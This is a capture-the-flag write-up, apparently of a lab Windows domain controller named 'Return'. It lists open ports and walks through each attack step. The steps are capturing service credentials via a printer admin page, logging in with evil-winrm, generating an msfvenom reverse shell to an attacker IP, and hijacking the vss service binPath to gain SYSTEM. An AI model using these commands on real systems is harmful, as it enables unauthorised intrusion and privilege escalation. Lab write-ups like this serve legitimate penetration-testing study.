# Return

- port 53/tcp DNS Simple DNS Plus
- port 80/tcp HTTP Microsoft IIS httpd 10.0
- port 88/tcp kerberos-sec Microsoft Windows Kerberos
- port 135/tcp msrpc Microsoft Windows RPC
- port 139/tcp netbios-ssn Microsoft Windows netbios-ssn
- port 389/tcp ldap Microsoft Windows Active Directory LDAP
- port 445/tcp microsoft-ds
- port 464/tcp passwd5? 
- port 593/tcp ncacn_http Microsoft Windows RPC over HTTP 1.0
- port 636/tcp tcpwrapped
- port 3268/tcp ldap Microsoft Windows Active Directory LDAP
- port 3269/tcp tcpwrapped
- port 5985/tcp WinRM http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
- port 9389/tcp mc-nmf .NET Message Framing
- port 47001/tcp http WinRM Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

### Exploitation

Web server on port 80 hosts printer config, allowing credential recovery for svc-printer account through 
settings tab by listening on port 389 and updating the Server address to our IP

Gain a remote shell with `evil-winrm -i 10.10.11.108 -u svc-printer -p password`

Enumerate the user

`whoami /priv`
`net user svc-printer`

The svc-printer user is a member of [Server Operators](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators) a default Group that can start and stop services

Create a meterpreter reverse shell with msfvenom

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe`

Using the evil-winrm shell we can upload the meterpreter shell and set it as a binary to a stopped service 
like vss, Volume Shadow Copy. Then we start msfconsole and run multi/handler with the correct payload, LHOST, 
and LPORT variables set. Finally stop and start the service to gain a remote shell as SYSTEM

```
*Evil-WinRM* PS C:> upload shell.exe
*Evil-WinRM* PS C:> sc.exe config vss binPath=C:\Users\svc-printer\Documents\shell.exe
*Evil-WinRM* PS C:> sc.exe stop vss
*Evil-WinRM* PS C:> sc.exe start vss
```

We can migrate to a more stable shell by running `ps` and then `migrate <PID>` to any service running as 
SYSTEM, drop into a shell and grab root.txt
